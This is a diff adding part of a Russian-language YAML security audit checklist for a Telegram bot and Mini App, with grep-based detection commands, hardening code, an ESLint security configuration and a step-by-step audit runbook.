+    title: "Telegram API вызовы без error handling"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'sendMessage\\|sendPhoto\\|api\\.telegram' bot/index.js | grep -c 'catch\\|try'"
+    remediation: |
+      async function safeSendMessage(chatId, text, options = {}) {
+        try {
+          return await bot.sendMessage(chatId, text, options);
+        } catch (err) {
+          if (err.response?.statusCode === 403) {
+            // Пользователь заблокировал бота — удалить из рассылки
+            await removeFromNotifications(chatId);
+          } else {
+            console.error(`Failed to send message to ${chatId}:`, err.message);
+          }
+        }
+      }
+    status: CHECK_REQUIRED
+
+  - id: "TG-003"
+    title: "Проверка типа Telegram update перед обработкой"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'update\\.message\\|update\\.callback_query' bot/index.js | head -10"
+    description: >
+      Telegram присылает разные типы updates: message, callback_query,
+      inline_query, pre_checkout_query. Обращение к отсутствующему полю
+      вызывает TypeError и падение обработчика.
+    remediation: |
+      app.post('/webhook', (req, res) => {
+        res.sendStatus(200); // Всегда отвечать 200 до обработки
+        const update = req.body;
+        if (update.message)        handleMessage(update.message).catch(console.error);
+        else if (update.callback_query) handleCallback(update.callback_query).catch(console.error);
+        // else — игнорировать неизвестные типы
+      });
+    status: CHECK_REQUIRED
+
+  - id: "TG-004"
+    title: "Inline кнопки с callback_data > 64 байт"
+    severity: LOW
+    owasp: "A04:2021 – Insecure Design"
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'callback_data' bot/index.js | awk '{print length, $0}' | sort -rn | head -10"
+    description: >
+      Telegram ограничивает callback_data до 64 байт.
+      Данные сверх лимита молча обрезаются → ошибки парсинга.
+    remediation: >
+      Хранить данные в БД, передавать только ID в callback_data:
+        callback_data: `order:${orderId}` // вместо всего объекта заказа
+    status: CHECK_REQUIRED
+
+  - id: "TG-005"
+    title: "Webhook не регистрируется автоматически при деплое"
+    severity: MEDIUM
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'setWebhook\\|webhook.*url\\|RAILWAY_PUBLIC_DOMAIN' bot/index.js"
+    description: >
+      При первом деплое или смене домена webhook нужно перерегистрировать.
+      Убедиться, что регистрация автоматическая.
+    remediation: |
+      const WEBHOOK_URL = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook`;
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          url: WEBHOOK_URL,
+          secret_token: process.env.WEBHOOK_SECRET,
+          allowed_updates: ['message', 'callback_query'],
+        }),
+      });
+    status: CHECK_REQUIRED
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 6 — ИНФРАСТРУКТУРА (INFRASTRUCTURE)
+# ═══════════════════════════════════════════════════════════════════════════════
+infrastructure_checks:
+
+  - id: "INFRA-001"
+    title: "Отсутствие CI/CD security pipeline"
+    severity: MEDIUM
+    detect:
+      - "ls .github/workflows/ 2>/dev/null || echo 'NO CI CONFIGURED'"
+    remediation: |
+      # .github/workflows/security.yml
+      name: Security Audit
+      on: [push, pull_request]
+      jobs:
+        security:
+          runs-on: ubuntu-latest
+          steps:
+            - uses: actions/checkout@v4
+            - uses: actions/setup-node@v4
+              with: { node-version: '20', cache: 'npm' }
+            - run: npm ci
+            - run: npm audit --audit-level=high
+            - run: npx secretlint '**/*.{js,json}'
+            - run: npx eslint --config eslint.config.security.js bot/
+    status: OPEN
+
+  - id: "INFRA-002"
+    title: "Принудительный HTTPS redirect"
+    severity: HIGH
+    files:
+      - { path: "bot/index.js" }
+    detect:
+      - "grep -n 'x-forwarded-proto\\|https.*redirect' bot/index.js"
+    remediation: |
+      if (process.env.NODE_ENV === 'production') {
+        app.use((req, res, next) => {
+          if (req.headers['x-forwarded-proto'] !== 'https') {
+            return res.redirect(301, `https://${req.hostname}${req.url}`);
+          }
+          next();
+        });
+      }
+    status: CHECK_REQUIRED
+
+  - id: "INFRA-003"
+    title: "NODE_ENV не установлен — production поведение не активно"
+    severity: MEDIUM
+    detect:
+      - "grep -n 'NODE_ENV' bot/index.js"
+    remediation: >
+      В Railway Environment Variables: NODE_ENV=production
+      Убедиться, что все production-only проверки зависят от NODE_ENV.
+    status: CHECK_REQUIRED
+
+  - id: "INFRA-004"
+    title: "Мёртвые файлы изображений в корне"
+    severity: LOW
+    detect:
+      - "ls *.jpeg *.jpg *.png 2>/dev/null"
+    description: >
+      bread-bagette.jpeg, bread-black.jpeg, etc. — изображения в корне репозитория.
+      Если они раздаются сервером, должны быть в bot/public/.
+      Если нет — удалить.
+    status: INFO
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# КОНФИГУРАЦИЯ ESLINT (eslint.config.security.js)
+# ═══════════════════════════════════════════════════════════════════════════════
+eslint_security_config:
+  output_file: "eslint.config.security.js"
+  install_command: >
+    npm install --save-dev eslint @eslint/js
+    eslint-plugin-security eslint-plugin-no-secrets
+  content: |
+    import js from '@eslint/js';
+    import security from 'eslint-plugin-security';
+    import noSecrets from 'eslint-plugin-no-secrets';
+
+    export default [
+      js.configs.recommended,
+      security.configs.recommended,
+      {
+        plugins: { security, 'no-secrets': noSecrets },
+        languageOptions: {
+          ecmaVersion: 2022,
+          sourceType: 'commonjs',
+          globals: {
+            process: 'readonly', console: 'readonly',
+            Buffer: 'readonly', __dirname: 'readonly',
+            require: 'readonly', module: 'readonly', exports: 'readonly',
+          },
+        },
+        rules: {
+          'security/detect-object-injection':          'warn',
+          'security/detect-non-literal-fs-filename':   'error',
+          'security/detect-eval-with-expression':      'error',
+          'security/detect-non-literal-regexp':        'warn',
+          'security/detect-possible-timing-attacks':   'error',
+          'security/detect-pseudoRandomBytes':         'error',
+          'security/detect-buffer-noassert':           'error',
+          'security/detect-child-process':             'error',
+          'security/detect-non-literal-require':       'warn',
+          'security/detect-unsafe-regex':              'error',
+          'no-secrets/no-secrets': ['error', { tolerance: 4.5 }],
+          'no-eval':         'error',
+          'no-implied-eval': 'error',
+          'no-new-func':     'error',
+          'no-script-url':   'error',
+          'no-console':      ['warn', { allow: ['warn', 'error', 'log'] }],
+        },
+        ignores: ['node_modules/**'],
+      },
+    ];
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# RUNBOOK — ПОШАГОВЫЙ ЗАПУСК АУДИТА
+# ═══════════════════════════════════════════════════════════════════════════════
+audit_runbook:
+  description: "Выполнять последовательно. Каждый шаг должен пройти без ошибок."
+  steps:
+
+    - step: 1
+      name: "Зависимости с CVE"
+      command: "npm audit --audit-level=moderate"
+      expected: "found 0 vulnerabilities"
+      check: SEC-012
+
+    - step: 2
+      name: "Секреты в исходном коде"
+      command: "npx secretlint '**/*.{js,json}'"
+      expected: "No secrets found"
+      check: SEC-015
+
+    - step: 3
+      name: "ESLint security rules"
+      command: "npx eslint --config eslint.config.security.js bot/"
+      expected: "0 problems"
+
+    - step: 4
+      name: "Semgrep OWASP Top 10"
+      command: "semgrep --config=p/owasp-top-ten --error bot/"
+      expected: "No findings"
+
+    - step: 5
+      name: "USER_ENTERED в Sheets"
+      command: "grep -n 'USER_ENTERED' bot/index.js && echo 'FOUND!' || echo 'OK'"
+      expected: "OK"
+      check: CRIT-006
+
+    - step: 6
+      name: "mode: no-cors в Mini App"
+      command: "grep -n 'no-cors' bot/index.html && echo 'FOUND!' || echo 'OK'"
+      expected: "OK"
+      check: CRIT-003
+
+    - step: 7
+      name: "initDataUnsafe как trusted ID"
+      command: "grep -n 'initDataUnsafe\\.user\\.id' bot/index.html && echo 'FOUND!' || echo 'OK'"
+      expected: "OK (должна быть HMAC верификация)"
+      check: CRIT-002
+
+    - step: 8
+      name: "Webhook secret token проверка"
+      command: "grep -n 'x-telegram-bot-api-secret-token' bot/index.js || echo 'MISSING!'"
+      expected: "Проверка реализована"
+      check: CRIT-001
+
+    - step: 9
+      name: "CORS конфигурация"
+      command: "grep -n 'Access-Control-Allow-Origin' bot/index.js"
+      expected: "Конкретные origin, не *"
+      check: CRIT-005
+
+    - step: 10
+      name: ".env не в git"
+      command: "git ls-files | grep '^\\.env$' && echo 'IN GIT!' || echo 'OK'"
+      expected: "OK"
+      check: SEC-009
+
+    - step: 11
+      name: "state.json удалён"
+      command: "grep -n 'state\\.json' bot/index.js && echo 'FOUND!' || echo 'MIGRATED TO DB'"
+      expected: "MIGRATED TO DB"
+      check: CRIT-004
+
+    - step: 12
+      name: "Мёртвый index.html удалён"
+      command: "ls index.html 2>/dev/null && echo 'STILL EXISTS' || echo 'REMOVED'"
+      expected: "REMOVED"
+      check: CRIT-007
+
+    - step: 13
+      name: "Helmet подключён"
+      command: "grep -n 'helmet' bot/index.js"
+      expected: "app.use(helmet(...))"
+      check: SEC-001
+
+    - step: 14
+      name: "Rate limiting настроен"
+      command: "grep -n 'rateLimit\\|rateLimiter' bot/index.js"
+      expected: "Лимиты применены к endpoints"
+      check: SEC-003
+
+# ─────────────────────────────────────────────────────────────────────────────
+# СТАТИСТИКА
+# ─────────────────────────────────────────────────────────────────────────────
+summary:
+  total: 55
+  by_severity:
+    CRITICAL: 9
+    HIGH:     20
+    MEDIUM:   19
+    LOW:       5
+    INFO:      2
+  by_status:
+    OPEN:           12
+    CHECK_REQUIRED: 43
+  owasp_coverage:
+    - "A01:2021 – Broken Access Control"
+    - "A02:2021 – Cryptographic Failures"
+    - "A03:2021 – Injection"
+    - "A04:2021 – Insecure Design"
+    - "A05:2021 – Security Misconfiguration"
+    - "A06:2021 – Vulnerable and Outdated Components"
+    - "A07:2021 – Identification and Authentication Failures"
+    - "A08:2021 – Software and Data Integrity Failures"
+    - "A09:2021 – Security Logging and Monitoring Failures"
+    - "A10:2021 – Server-Side Request Forgery"
+  telegram_specific:
+    - "initData HMAC-SHA256 верификация"
+    - "Webhook secret token проверка"
+    - "auth_date freshness check"
+    - "Callback data size limit (64 bytes)"
+    - "User ID spoofing prevention"
+    - "Formula injection via USER_ENTERED"
